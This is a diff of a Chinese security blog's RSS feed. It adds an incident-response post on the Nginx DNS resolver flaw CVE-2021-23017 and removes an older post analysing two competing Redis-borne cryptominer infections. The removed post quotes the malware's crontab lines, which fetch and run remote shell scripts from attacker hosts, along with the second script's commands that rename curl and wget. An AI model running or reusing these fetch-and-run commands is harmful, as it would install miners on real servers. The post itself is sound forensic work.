@@ -6,7 +6,7 @@
   <link href="/rss.xml" rel="self"/>
   
   <link href="http://www.tr0y.wang/"/>
-  <updated>2021-05-24T11:00:00.000Z</updated>
+  <updated>2021-05-28T11:00:00.000Z</updated>
   <id>http://www.tr0y.wang/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>对 Nginx DNS 解析漏洞的应急响应</title>
+    <link href="http://www.tr0y.wang/2021/05/28/CVE-2021-23017/"/>
+    <id>http://www.tr0y.wang/2021/05/28/CVE-2021-23017/</id>
+    <published>2021-05-28T11:00:00.000Z</published>
+    <updated>2021-05-28T11:00:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>经常有小伙伴问我应急响应平时有哪些事情要做，今天我就分享一次新鲜的应急（CVE-2021-23017）</p><span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CVE-2021-23017，第一次见是在绿盟的公众号：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528102750.png!blog#width-zoom7" alt=""></p><p>现在的公众号，一般会把比较重要或者有价值的信息放在靠上的位置，所以我当时看到这个推送，先去看了一下 VMware 的洞。本来都不打算看第二条，谁让它是 Nginx 的洞呢，我想还是值得一看的。这里我把漏洞描述搬运过来了（不重要的信息已省略）：</p><blockquote><p>5月26日，… Nginx 官方发布安全公告，修复了 nginx 解析器中的一个 DNS 解析程序漏洞（CVE-2021-23017），… 在处理 DNS 响应时存在错误，当 nginx 配置文件中使用了 resolver 指令时，… 攻击者能够伪造来自 DNS 服务器的 UDP 数据包，… 导致 1 字节内存覆盖，从而造成拒绝服务或任意代码执行…</p><p>…</p><p>受影响版本：Nginx 0.6.18 - 1.20.0<br>…</p></blockquote><p>resolver 这玩意一般是用于反代，橘友们可以看看这篇文章，了解一下具体的作用与场景，我就不赘述了：</p><p><a href="https://www.jianshu.com/p/5caa48664da5">https://www.jianshu.com/p/5caa48664da5</a></p><p>然后这种新爆出的，内存覆盖、溢出啥的 CVE，poc 一般都没公开，更不用说 exp 了，所以我看完就关了，懒得去找 poc 了。</p><p>所以当天我得出的结论是：</p><ol><li>不用 resolver 配置的 Nginx，不受影响</li><li>由于攻击者要需要伪造 DNS 服务器的响应，所以如果用的是内网的 DNS 那么影响程度就很小了</li><li>由于 resolver 用的还算比较多，所以还是有必要排查具体的使用情况</li><li>按照版本匹配，低于这个版本评估一下，该升级的直接升级，该改配置的改配置。大多数生产网的 Nginx 版本没有那么高，升级的话可能要跨多个版本，还是需要小心一些的</li><li>受影响版本：Nginx 0.6.18 - 1.20.0</li></ol><p>以上是背景。</p><h2 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h2><p>27 号大晚上的，正在 ow 里和队友 “友好交流”，有位老伙计（某互联网金融公司）问我有没有看到这个 CVE 的相关信息，然后问了我这么一个问题：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528111227.png!blog" alt=""></p><p>同时给出了两个版本的 openresty：<code>1.13.6.x</code> 和 <code>1.15.8.x</code></p><p>这个问题勾起了我的好奇心。</p><p>openresty，写过 waf 的橘友们应该都接触过。我虽然没用过，但没吃过猪肉我也见过猪跑，在我对 openresty 浅薄的认知里，openresty 就是魔改的 Nginx（基于 Nginx 做的一个 Web 应用服务器，特点是可以用 Lua 脚本语言调用 Nginx 支持的各种 C 以及 Lua 模块，性能超强）。</p><p>好了，接下来开始帮忙这位老伙计应个急。噢，我的老伙计，大晚上你怎么在修福报？大家混口饭吃都不容易，还是帮他一把，游戏咱先不打了。</p><p>首先，这位老伙计说，他们的 openresty 是基于 Nginx 二次开发的，那么这里其实有个坑，基于 Nginx 二次开发，有可能是魔改了 openresty，也有可能是魔改了 Nginx，也有可能他说的就是官方的 openresty（因为官方就是在 Nginx 上做二次开发），所以这一点一定要问清楚。这里就是第一个小经验，永远不要直接通过研发/运维说的话得出结论，要换一种说法再问一遍，如果对的上那才能得出结论，所以我问了这么一个问题：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528105640.png!blog" alt=""></p><p>得到的回复是：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528105748.png!blog" alt=""></p><p>那么现在就可以得出结论了，他们其实用的就是官方版本的 openresty，无其他魔改操作。</p><p>接下来，我先去 openresty 官网（这里是第二个小经验，信息尽量找权威渠道获取）查一下官方的发布记录，看有没有写明是基于哪个 Nginx 版本，果然有：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528110532.png!blog#width-zoom8" alt=""></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528110616.png!blog#width-zoom8" alt=""></p><p>嗯，按照版本匹配，这位老伙计的 openresty 都是受此漏洞影响的。</p><p>排查到这里，结论好像几乎就在嘴边了：升级 openresty 至最新版本？</p><p>当我去找了一下最新版的 openresty <code>1.19.3.1</code> 的发布信息，发现它是基于的是 Nginx <code>1.19.3</code>：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528105931.png!blog" alt=""></p><p>这就比较麻烦了，按照版本匹配，openresty 最新版用的 Nginx 也是受此漏洞影响的。<strong>所以单单升级 openresty 至最新版是没有啥用的。</strong></p><p>（这里顺便提一个在排查过程中发现的很有意思的现象，openresty 好像是在每个大版本的第一小版本更新 Nginx core，并且版本的命名与 Nginx 是同步的，比如 使用的 Nginx 是 1.19.3 的话，那么 openresty 的版本就是 1.19.3.1）</p><p>应急继续。既然没法直接修复漏洞，那就问问是否满足利用条件：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528111101.png!blog" alt=""></p><p>老伙计证实确实有用到这个配置：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528111331.png!blog#width-zoom6" alt=""></p><p>并且还给出了配置文件：<br><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">...<br><br>resolver 127.0.0.1<br><br>...<br></code></pre></div></td></tr></table></figure></p><p>可以看到，这是不满足我先前的第二个结论的，由于攻击者要需要伪造 DNS 服务器的响应，而这个 DNS 服务器与 openresty 在一台服务器上，走本地回环进行通信，所以暂时可以不用担心被攻击了。</p><p>定心丸有了，还是得解决根本问题。现在 openresty 官方还没发布修复，对于这种开源的组件，可以先去 GitHub 看看有无 issue（这又是一个小经验），有，而且很新：</p><p><a href="https://github.com/openresty/openresty/issues/738">https://github.com/openresty/openresty/issues/738</a></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528112355.png!blog" alt=""></p><p>26 号当天就有人提了，然后 27 号上午就有补丁发布，但是处于 Open 状态。</p><p>然后我看了一下这个补丁：</p><p><a href="https://github.com/openresty/openresty/pull/739">https://github.com/openresty/openresty/pull/739</a></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528112806.png!blog" alt=""></p><p>看起来只需要给 <code>src/core/ngx_resolver.c</code> 加一些代码即可。</p><p>然后呢，这里又有个小经验，看到补丁不要着急使用，一定要确认这个补丁是不是官方给的（官方 review 过、merged、核心开发者 push 等），如果不是的话可能有恶意代码，需要仔细看。</p><p>那么直接采用这个补丁肯定多少有点安全风险；而判断这个人是不是核心开发者也比较麻烦，毕竟那么多大佬咱也记不住名字；review 代码呢，咱也不一定看得懂。但是没事，代码咱们不敢用，打补丁的思路可以参考。</p><p>所以一开始我想直接把 <code>ngx_resolver.c</code> 换成最新的就完事了：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528115813.png!blog" alt=""></p><p>但后来发现有点不对，因为在 openresty 源码中，我只找到了 <code>.patch</code> 文件，并没有找到 Nginx 的源码。于是我 clone 了一下 xiaocang 这位老哥的版本，试了下 make，发现 patch 文件是在 make 阶段就直接打上了：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528115610.png!blog" alt=""></p><p>学习了。</p><p>然后 make 的过程中，我发现 <code>ngx_resolver.c</code> 这个文件之前就已经有 3 个补丁了，所以它现在与官方的 <code>ngx_resolver.c</code> 肯定会有很多不一样的地方，我抱着试一试的心态直接对比了一下这位老哥 patch 后的和 Nginx <code>1.21.0</code> 的 <code>src/core/ngx_resolver.c</code> 代码，看看这位老哥的修复方式与官方有什么区别：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528134600.png!blog" alt=""></p><p>这段是最重要的代码，处理方式好像差不多，至少没看出有安全问题，至于功能上嘛，咱也没读过 Nginx 源码，不知道有没有问题。而其他地方，相比与官方的补丁，这位老哥的补丁少了一些 invalid 的处理，比如：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528135221.png!blog" alt=""></p><p>嗯，所以这个补丁要不要用呢？这个时候，我又去 Nginx 官网看了一眼漏洞信息：</p><p><a href="http://mailman.nginx.org/pipermail/nginx-announce/2021/000300.html">http://mailman.nginx.org/pipermail/nginx-announce/2021/000300.html</a></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528153404.png!blog" alt=""></p><p>嗯？这是啥？</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528153435.png!blog" alt=""></p><p>…好家伙，原来就是这个补丁…那没事了…</p><p>所以我给老伙计的建议是：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528153850.png!blog" alt=""></p><p>我 27 号晚上看的时候，这个 pull request 还是 Open 的，等待 review 中，28 号早上再看已经 merged 了：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/CVE-2021-23017/20210528112938.png!blog" alt=""></p><p>效率真高。既然已经合并到 master 里了，那么直接按照他这个进行 patch 即可，clone 然后重新 <code>make &amp;&amp; make install</code> 就好了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一些经验：</p><ol><li>永远不要直接通过研发/运维说的话得出结论</li><li>信息尽量找权威渠道获取</li><li>对于开源的组件，可以先去开源的地方看一下 issue，可能漏洞已经有人通知了他们，甚至都已经在修复中了；如果没有，可以开个 issue 提醒一下。</li><li>看到漏洞补丁不要着急使用，一定要确认这个补丁是不是官方给的</li></ol><p>整个应急过程中其实没用到什么复杂的技术，也没花费很多时间，都是基操，更多的还是看经验。这次应急并没有直接与业务/运维沟通，其实出现一个新的漏洞，也不一定就必须升级组件，具体情况还得具体分析，这种工作算是甲方安全应急人员日常工作的一小部分。大佬们随便放出几个 CVE，我们就要哼哧哼哧地去排查、去推进。</p><p><strong>CVE 强者，恐怖如斯</strong></p><p><br><p style="text-align: center;" ><font size="2px" color="gray">《反序列化 PHP 篇》<br>也差不多写完了<br>快发了快发了<br>这次不鸽！<br></font><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;经常有小伙伴问我应急响应平时有哪些事情要做，今天我就分享一次新鲜的应急（CVE-2021-23017）&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="过程记录" scheme="http://www.tr0y.wang/categories/%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
+    
+    
+      <category term="应急响应" scheme="http://www.tr0y.wang/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
+    
+  </entry>
   
   <entry>
     <title>SecMap - SSRF</title>
@@ -437,6 +460,8 @@
       <category term="过程记录" scheme="http://www.tr0y.wang/categories/%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
     
     
+      <category term="Linux" scheme="http://www.tr0y.wang/tags/Linux/"/>
+    
       <category term="CVE" scheme="http://www.tr0y.wang/tags/CVE/"/>
     
       <category term="Vuln" scheme="http://www.tr0y.wang/tags/Vuln/"/>
@@ -444,8 +469,6 @@
       <category term="Poc&amp;Exp" scheme="http://www.tr0y.wang/tags/Poc-Exp/"/>
     
       <category term="应急响应" scheme="http://www.tr0y.wang/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
-    
-      <category term="Linux" scheme="http://www.tr0y.wang/tags/Linux/"/>
     
   </entry>
   
@@ -469,29 +492,6 @@
     
     
       <category term="Linux" scheme="http://www.tr0y.wang/tags/Linux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>睡前小故（ying）事（ji）</title>
-    <link href="http://www.tr0y.wang/2020/07/31/virus-beat-virus/"/>
-    <id>http://www.tr0y.wang/2020/07/31/virus-beat-virus/</id>
-    <published>2020-07-31T07:33:29.000Z</published>
-    <updated>2020-07-31T07:33:29.000Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>当病毒 A 遇到病毒 B，它们会打起来吗？</p><span id="more"></span><p>睡前接到告警，发现某服务器的 crontab 有一条这个内容：<br><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">REDIS0008�redis-ver4<span class="hljs-number">.0</span><span class="hljs-number">.6</span>�<br>�edis-bits�@�ctime½�_used-mem�<br> aof-preamble���Back1?<br>*<span class="hljs-regexp">/10 * * * * curl -fsSL http:/</span><span class="hljs-regexp">/d.powerofwish.com/</span>pm.sh | sh<br></code></pre></div></td></tr></table></figure><br>嗐，一看就知道是 Redis 进来的…应急响应做多了，都没当初那种兴奋的感觉了…连上服务器之后，看了一下进程信息，只发现了一个 <code>king</code> 开头的进程，cpu 占用率很低。这就很奇怪了，这帮大黑阔们写工具、病毒，批量扫描外网服务入侵可不是闲着没事做的，不吸干你的性能怎么肯罢休？并且看了一下 cron 的日志（只有从 26 号开始的），curl 一直是失败的，原因是 <code>curl not found</code>，这就很有意思了。Google 了一下 <code>d.powerofwish.com</code> 相关的信息，发现全是通过 Redis 未授权访问进来的。查了一下记录，这个服务器前段时间的确扫出过一个 Redis 未授权访问，但是 HIDS 正好是今天才部署的，所以可能已经被入侵一段时间了。查看 <code>/tmp/</code> 下的病毒创建时间，的确是对的上的。至此，所有信息都指向了 Redis 未授权访问，溯源差不多完成了：通过 Redis 未授权访问进入服务器，写 Crontab 做了持久化。</p><p>回到之前那个疑问：这帮大黑阔可不是什么好心人，虽然前段时间有个新闻，说有攻击者扫描全网入侵未授权的 es、MongoDB 等，成功直接清空所有的数据，还有个名字叫 <code>MEOWBOT</code>（喵星人？我汪星人什么时候能崛起！气抖冷！）。入侵服务器必有所图，一般都是挖门罗币，可是这个服务器并没有挖矿进程再运行。既然如此，那莫非是想将服务器当做肉鸡？于是我检查了一下 ssh key，发现 <code>authorized_keys</code> 新增了几条，特征是 <code>root@u17</code> 结尾，随后又在 root 的 crontab 配置文件中发现了 <code>curl http://185.181.10.234/E5DB0E07C3D7BE80V520/init.sh</code>。经过搜索，发现这居然是另一种病毒，也是利用 Redis 未授权入侵的…</p><p>那就 curl 下来瞅瞅呗。<code>init.sh</code> 代码还稍有点多，实际上做的事情就是：<strong>杀掉其他挖矿病毒</strong>，将常用命令替换，例如<code>curl</code>换成<code>cur</code>这样：<br><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">mv <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/wget /u</span>sr<span class="hljs-regexp">/bin/g</span>et<br>mv <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/xget /u</span>sr<span class="hljs-regexp">/bin/g</span>et<br>mv <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/get /u</span>sr<span class="hljs-regexp">/bin/</span>wge<br>mv <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl /u</span>sr<span class="hljs-regexp">/bin/u</span>rl<br>mv <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/xurl /u</span>sr<span class="hljs-regexp">/bin/u</span>rl<br>mv <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/url /u</span>sr<span class="hljs-regexp">/bin/</span>cur<br></code></pre></div></td></tr></table></figure><br>而 <code>init.sh</code> 的击杀目标里真好有 <code>pm.sh</code>相关的文件！</p><p>那有意思的就来了，所以服务器没有运行挖矿病毒，是不是因为 <code>pm.sh</code> 的进程与相关恶意文件（<code>kin</code> 开头）已经被 <code>init.sh</code> 全干掉了呢？在我溯源文件的修改时间定位入侵顺序，理清楚时间线之后，我已经脑补出一部大片了：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/virus-beat-virus/20200731033543028.png!blog" alt=""><br><code>pm.sh</code>（就叫小 p 了）是第一个通过 redis 未授权进来的病毒，首先判断是不是存在一个 bin 文件，如不存在，就下载它，然后执行这个 bin 文件。每隔 10 分钟它就会通过 crontab 运行一遍上面的流程。</p><p><code>init.sh</code>（就叫小 i 了）是第二个通过 redis 未授权进来的病毒，它也是通过 crontab 10 分钟运行一次，但是它还替换了 <code>curl</code>、杀死了自己的竞争者。（改一改都可以当做杀毒脚本了[手动狗头]）</p><p>虽然 小 p 比小 i 早进入到服务器，获得了 root 权限，但是小 p 并没有挤兑同行与做自我保护，从而被后来居上的小 i 清空了 小 p 的所有病毒文件，并且替换了多个可用于下载的命令，导致了小 p 无法重新下载（执行 curl）（这解释了为何 cron 日志告诉我们小 p 的 curl 其实没有执行成功，且又有成功下载的文件）。小 i 斩草除根，实乃冷酷杀手的典范。在排查的过程中，我还发现了另一个疑似残留的病毒文件：<code>/tmp/redis2</code>，同样在小 i 的击杀名单上。至于它到底是小 p 的，还是第三种病毒，已经无从考证了，因为它早已经被小 i 轰杀至渣了…要不是因为入侵的是我们公司的服务器，我真想给小 i 鼓个掌。</p><p>清理完毕，夜也深了，这个没有硝烟的战场最后并没有赢家。</p><p>呵，黑阔。</p><p><br><p style="text-align: center;" ><font size="2px" color="gray">来呀快活呀</font><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;当病毒 A 遇到病毒 B，它们会打起来吗？&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="过程记录" scheme="http://www.tr0y.wang/categories/%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
-    
-    
-      <category term="应急响应" scheme="http://www.tr0y.wang/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
     
   </entry>
   
